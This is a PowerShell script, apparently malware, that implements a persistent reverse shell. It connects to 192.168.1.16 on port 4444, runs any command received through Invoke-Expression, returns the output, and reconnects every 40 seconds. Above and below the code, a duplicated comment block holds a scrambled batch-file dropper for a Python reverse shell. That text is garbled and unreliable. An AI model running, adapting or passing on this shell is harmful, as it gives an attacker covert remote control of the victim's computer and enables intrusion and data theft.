<#
start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
yÈh @yÈh off > ([µÛ]£.bat
yÈh cd %µé©% >> ([µÛ]£.bat
yÈh :) >> ([µÛ]£.bat
yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    {¦ 
çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
#>
$ip = "192.168.1.16"
$port = 4444

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)

        function Execute-Command {
            param([string]$cmd)

            $output = $errorOutput = $null

            try {
                $output = Invoke-Expression -Command $cmd
            } catch {
                $errorOutput = $_.Exception.Message
            }

            return $output, $errorOutput
        }

        while ($true) {
            $prompt = (Get-Location).Path + "> "
            $writer.Write($prompt)
            $writer.Flush()

            $command = $reader.ReadLine()

            if ($command -eq "exit") {
                break
            }

            if ($command -match '^cd\s+/d\s+(\S+)$') {
                $drive = $matches[1]
                Set-Location -Path $drive
                continue
            }

            $output, $errorOutput = Execute-Command -cmd $command

            $writer.WriteLine($output -join "`n")
            $writer.WriteLine($errorOutput)
            $writer.Flush()
        }
    } catch {
        
    } finally {
        $client.Close()
    }

    
    Start-Sleep -Seconds 40
}
<#
start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
yÈh @yÈh off > ([µÛ]£.bat
yÈh cd %µé©% >> ([µÛ]£.bat
yÈh :) >> ([µÛ]£.bat
yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    {¦ 
çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
#>
